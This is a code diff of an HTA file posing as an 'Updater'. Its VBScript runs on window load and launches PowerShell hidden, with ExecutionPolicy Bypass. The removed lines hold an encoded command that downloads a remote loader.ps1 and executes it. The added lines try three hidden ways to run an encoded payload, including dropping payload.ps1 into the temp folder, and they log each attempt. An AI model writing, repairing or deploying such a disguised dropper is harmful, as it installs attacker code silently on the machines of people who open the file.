@@ -16,60 +16,76 @@
   <title>Updater</title>
   <script language="VBScript">
     Sub Window_OnLoad()
-        Dim sh, psPath, psArgs, fso, debugPath
-        Set sh = CreateObject("WScript.Shell")
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        
-        ' Create debug log
-        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
-        
-        ' Log execution context
-        Dim debugFile
-        Set debugFile = fso.CreateTextFile(debugPath, True)
-        debugFile.WriteLine "HTA Debug Log: " & Now()
-        debugFile.WriteLine "User: " & sh.ExpandEnvironmentStrings("%USERNAME%")
-        debugFile.WriteLine "ComputerName: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-        debugFile.WriteLine "Temp: " & sh.ExpandEnvironmentStrings("%TEMP%")
-        debugFile.WriteLine "SystemRoot: " & sh.ExpandEnvironmentStrings("%SystemRoot%")
-        
-        ' Test PowerShell path
-        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
-        debugFile.WriteLine "PowerShell Path: " & psPath
-        debugFile.WriteLine "PowerShell Exists: " & fso.FileExists(psPath)
-        
-        ' Test simple PowerShell command first
-        Dim testCmd
-        testCmd = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Add-Content -Path '" & debugPath & "' -Value 'PowerShell executed successfully'"""
-        debugFile.WriteLine "Test Command: " & testCmd
-        debugFile.Close
-        
-        ' Run test command
-        sh.Run testCmd, 0, True
-        
-        ' Wait then run your actual payload
-        setTimeout "RunPayload", 2000
-    End Sub
-    
-    Sub RunPayload()
-        Dim sh, psPath, psArgs, fso, debugPath
+        Dim sh, psPath, fso, debugPath, encodedCmd
         Set sh = CreateObject("WScript.Shell")
         Set fso = CreateObject("Scripting.FileSystemObject")
         
         debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
         psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
-        psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
         
-        ' Log payload execution
+        ' Your base64 encoded command
+        encodedCmd = "<base-64 string>"
+        
+        ' Test 1: Decode the base64 command to see what it contains
+        Dim decodeCmd
+        decodeCmd = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "')) | Out-File -FilePath '" & debugPath & "' -Append"""
+        
         Dim debugFile
         Set debugFile = fso.OpenTextFile(debugPath, 8, True)
-        debugFile.WriteLine "Executing payload: " & Now()
-        debugFile.WriteLine "Full command: " & Chr(34) & psPath & Chr(34) & " " & psArgs
+        debugFile.WriteLine "=== DECODE TEST ==="
+        debugFile.WriteLine "Decode command: " & decodeCmd
         debugFile.Close
         
-        ' Execute your payload
-        sh.Run Chr(34) & psPath & Chr(34) & " " & psArgs, 0, False
+        sh.Run decodeCmd, 0, True
         
-        ' Cleanup after delay
+        ' Test 2: Try different execution methods
+        setTimeout "TestExecution", 2000
+    End Sub
+    
+    Sub TestExecution()
+        Dim sh, psPath, fso, debugPath, encodedCmd
+        Set sh = CreateObject("WScript.Shell")
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        
+        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
+        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
+        encodedCmd = "<base-64 string>"
+        
+        Dim debugFile
+        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
+        debugFile.WriteLine "=== EXECUTION TESTS ==="
+        debugFile.Close
+        
+        ' Method 1: Direct execution (what you're currently doing)
+        Dim cmd1
+        cmd1 = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd
+        debugFile.WriteLine "Method 1: " & cmd1
+        debugFile.Close
+        sh.Run cmd1, 0, False
+        
+        ' Method 2: Use cmd.exe wrapper
+        Dim cmd2
+        cmd2 = "cmd.exe /c """ & Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & """"
+        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
+        debugFile.WriteLine "Method 2: " & cmd2
+        debugFile.Close
+        sh.Run cmd2, 0, False
+        
+        ' Method 3: Write to temp file and execute
+        Dim tempPsPath
+        tempPsPath = sh.ExpandEnvironmentStrings("%TEMP%\payload.ps1")
+        Dim decodeAndSave
+        decodeAndSave = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "')) | Out-File -FilePath '" & tempPsPath & "' -Encoding UTF8"""
+        sh.Run decodeAndSave, 0, True
+        
+        ' Execute the decoded script
+        Dim cmd3
+        cmd3 = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPsPath & """"
+        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
+        debugFile.WriteLine "Method 3: " & cmd3
+        debugFile.Close
+        sh.Run cmd3, 0, False
+        
         setTimeout "CleanupAndExit", 5000
     End Sub
     
